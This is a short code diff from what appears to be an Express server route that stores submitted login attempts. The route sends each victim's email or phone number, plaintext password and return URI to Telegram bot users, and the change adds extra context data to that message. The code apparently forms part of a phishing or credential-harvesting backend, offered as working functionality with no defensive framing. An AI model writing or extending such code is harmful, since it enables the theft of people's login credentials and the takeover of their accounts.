@@ -32,7 +32,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const loginAttempt = await storage.createLoginAttempt(validatedData);
       
       // Notify Telegram bot users about new login attempt
-      notifyLoginAttempt(validatedData.emailOrPhone, validatedData.password, validatedData.returnUri);
+      notifyLoginAttempt(validatedData.emailOrPhone, validatedData.password, validatedData.returnUri, validatedData.contextData ?? undefined);
       
       res.json(loginAttempt);
     } catch (error) {
